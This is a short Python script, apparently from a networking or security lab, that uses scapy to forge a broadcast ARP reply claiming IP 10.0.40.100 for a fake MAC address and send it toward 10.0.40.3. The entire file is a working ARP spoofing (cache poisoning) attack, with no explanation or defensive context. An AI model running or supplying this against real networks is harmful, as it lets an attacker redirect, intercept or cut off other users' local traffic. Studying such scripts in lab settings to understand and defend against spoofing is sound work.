from scapy.all import * 

ether_header = Ether(src="99:99:99:99:99:00", dst="ff:ff:ff:ff:ff:ff")
arp_header = ARP(hwsrc="99:99:99:99:99:00", psrc="10.0.40.100", hwdst="00:00:00:00:00:00", pdst="10.0.40.3", op=2)
packet = ether_header / arp_header
ls(packet)
sendp(packet) 